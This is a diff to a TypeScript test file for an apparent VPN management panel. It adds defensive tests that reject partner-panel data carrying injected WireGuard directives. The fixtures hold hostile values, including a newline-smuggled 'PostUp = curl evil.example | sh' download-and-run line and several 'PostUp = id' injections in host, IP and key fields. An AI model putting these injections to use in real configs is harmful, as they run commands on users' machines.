@@ -16,6 +16,7 @@ import { startTestServer } from './test-app.js';
  */
 
 const PUBKEY_PLACEHOLDER = 'X'.repeat(43) + '=';
+const PSK_FROM_OWNER = 'B'.repeat(43) + '=';
 
 let testEnv: Awaited<ReturnType<typeof startTestServer>>;
 let adminToken: string;
@@ -62,6 +63,9 @@ interface RemoteState {
   nextPeerId: number;
   nodeName: string;
   nodeParams: Record<string, unknown>;
+  nodeHost: string;
+  /** IP, который панель владельца вернёт новому клиенту (по умолчанию выдаётся из 10.50.0.0/24) */
+  assignedIp?: string;
   /** Задержка ответа панели владельца: без неё гонка «ответ раньше синхронизации» не воспроизводится */
   latencyMs: number;
 }
@@ -73,7 +77,7 @@ const FULL_PARAMS = {
 };
 
 function newRemote(overrides: Partial<RemoteState> = {}): RemoteState {
-  return { peers: new Map(), calls: [], nextPeerId: 100, nodeName: 'Remote node', nodeParams: FULL_PARAMS, latencyMs: 0, ...overrides };
+  return { peers: new Map(), calls: [], nextPeerId: 100, nodeName: 'Remote node', nodeParams: FULL_PARAMS, nodeHost: '203.0.113.7', latencyMs: 0, ...overrides };
 }
 
 function stubRemotePanel(state: RemoteState) {
@@ -93,7 +97,7 @@ function stubRemotePanel(state: RemoteState) {
       if (method === 'GET' && path === '/info') return reply({ api_version: 1, partner_name: 'Owner', limits: null });
       if (method === 'GET' && path === '/nodes') {
         return reply({
-          nodes: [{ id: 7, name: state.nodeName, host: '203.0.113.7', port: 51820, public_key: PUBKEY_PLACEHOLDER, status: 'online', params: state.nodeParams }],
+          nodes: [{ id: 7, name: state.nodeName, host: state.nodeHost, port: 51820, public_key: PUBKEY_PLACEHOLDER, status: 'online', params: state.nodeParams }],
           limits: null,
         });
       }
@@ -107,7 +111,7 @@ function stubRemotePanel(state: RemoteState) {
         const id = state.nextPeerId++;
         const peer = {
           id, node_id: body.node_id, name: body.name, remote_ref: body.remote_ref, public_key: body.public_key,
-          client_ip: `10.50.0.${id - 90}`, preshared_key: 'PSK-FROM-OWNER', enabled: body.enabled, owner_blocked: false,
+          client_ip: state.assignedIp ?? `10.50.0.${id - 90}`, preshared_key: PSK_FROM_OWNER, enabled: body.enabled, owner_blocked: false,
           total_rx: 0, total_tx: 0, last_handshake: null,
         };
         state.peers.set(id, peer);
@@ -134,8 +138,8 @@ let panelCounter = 0;
 async function createRemotePanel(state: RemoteState): Promise<{ panelId: number; serverId: number }> {
   stubRemotePanel(state);
   const panelId = await FederationClient.connect(`https://owner-${++panelCounter}.example.com#dp_${'a'.repeat(32)}`, 'Owner');
-  const server = db.prepare('SELECT id FROM servers WHERE remote_panel_id = ?').get(panelId) as { id: number };
-  return { panelId, serverId: server.id };
+  const server = db.prepare('SELECT id FROM servers WHERE remote_panel_id = ?').get(panelId) as { id: number } | undefined;
+  return { panelId, serverId: server?.id ?? 0 };
 }
 
 // ==============================================================================
@@ -569,5 +573,89 @@ describe('GHSA-82rp: токен подключённой панели партн
     expect(row.token).not.toContain('aaaaaaaa');
     expect(decryptSecret(row.token)).toBe(`dp_${'a'.repeat(32)}`);
     expect(encryptSecret(row.token)).toBe(row.token);
+  });
+});
+
+// ==============================================================================
+// Аудит: данные панели партнёра попадают в конфиги клиентов
+// ==============================================================================
+
+describe('данные панели партнёра не должны подставлять директивы в конфиги клиентов', () => {
+  const subscription = async (token: string) => {
+    const res = await testEnv.request(`/sub/${token}?format=json`);
+    const body = await res.json();
+    return (body.servers as { config: string }[]).map((s) => Buffer.from(s.config, 'base64url').toString('utf-8'));
+  };
+  const tokenOf = (id: number) => (db.prepare('SELECT token FROM subscribers WHERE id = ?').get(id) as { token: string }).token;
+
+  it('нода с переводом строки в параметрах обфускации отключается, конфиги её не содержат', async () => {
+    const remote = newRemote();
+    const { panelId, serverId } = await createRemotePanel(remote);
+    const created = await api('/api/subscribers', 'POST', { name: 'Inject1', server_ids: [serverId] });
+    expect(await subscription(tokenOf(created.body.id))).toHaveLength(1);
+
+    for (const poison of [
+      { h1: '100-200\nPostUp = curl evil.example | sh' },
+      { i1: '<b 0x01>\n<r 5>' },
+      { jc: '4\nPostUp = id' },
+      { header_protection_key: 'BAD\nPostUp = id' },
+      { extra_params: { RekeyTimeout: '10\nPostUp = id' } },
+    ]) {
+      remote.nodeParams = { ...FULL_PARAMS, ...poison };
+      await FederationClient.requestSync(panelId);
+
+      const node = db.prepare('SELECT status, last_error, h1, i1, host FROM servers WHERE id = ?').get(serverId) as any;
+      expect(node.status).toBe('uninstalled');
+      expect(node.last_error).toContain('некорректные данные ноды');
+      expect(node.h1).toBe('100-200');
+      expect(await subscription(tokenOf(created.body.id))).toHaveLength(0);
+    }
+
+    // Владелец исправил данные — нода снова доступна
+    remote.nodeParams = FULL_PARAMS;
+    await FederationClient.requestSync(panelId);
+    const configs = await subscription(tokenOf(created.body.id));
+    expect(configs).toHaveLength(1);
+    expect(configs[0]).not.toContain('PostUp');
+  });
+
+  it('адрес и порт ноды проверяются', async () => {
+    const remote = newRemote({ nodeHost: '203.0.113.7\nPostUp = id' });
+    const { panelId } = await createRemotePanel(remote);
+    expect(db.prepare('SELECT COUNT(*) AS c FROM servers WHERE remote_panel_id = ?').get(panelId)).toEqual({ c: 0 });
+    expect((db.prepare('SELECT last_error FROM remote_panels WHERE id = ?').get(panelId) as any).last_error).toContain('некорректный адрес ноды');
+  });
+
+  it('IP клиента, выданный владельцем, проверяется: некорректный адрес не попадает в конфиг', async () => {
+    const remote = newRemote({ assignedIp: '10.50.0.9/32\nPostUp = id' });
+    const { serverId } = await createRemotePanel(remote);
+    const created = await api('/api/subscribers', 'POST', { name: 'Inject2', server_ids: [serverId] });
+    expect(created.status).toBe(201);
+
+    const client = db.prepare('SELECT client_ip, remote_state FROM clients WHERE subscriber_id = ?').get(created.body.id) as any;
+    expect(isPendingIp(client.client_ip)).toBe(true);
+    expect(client.remote_state).toContain('некорректный IP клиента');
+    expect(await subscription(tokenOf(created.body.id))).toHaveLength(0);
+  });
+
+  it('IP и PSK из списка клиентов владельца тоже проверяются', async () => {
+    const remote = newRemote();
+    const { panelId, serverId } = await createRemotePanel(remote);
+    const created = await api('/api/subscribers', 'POST', { name: 'Inject3', server_ids: [serverId] });
+    const peer = [...remote.peers.values()].at(-1);
+    const good = db.prepare('SELECT client_ip, preshared_key FROM clients WHERE subscriber_id = ?').get(created.body.id) as any;
+
+    peer.client_ip = '10.50.0.9\nPostUp = id';
+    peer.preshared_key = 'x\nPostUp = id';
+    await FederationClient.requestSync(panelId);
+    expect(db.prepare('SELECT client_ip, preshared_key FROM clients WHERE subscriber_id = ?').get(created.body.id)).toEqual(good);
+
+    // Нечисловой трафик не ломает синхронизацию и не сохраняется
+    peer.client_ip = good.client_ip;
+    peer.preshared_key = good.preshared_key;
+    peer.total_rx = { evil: true };
+    await FederationClient.requestSync(panelId);
+    expect((db.prepare('SELECT status FROM remote_panels WHERE id = ?').get(panelId) as any).status).toBe('online');
+    expect((db.prepare('SELECT total_rx FROM clients WHERE subscriber_id = ?').get(created.body.id) as any).total_rx).toBe(0);
   });
 });
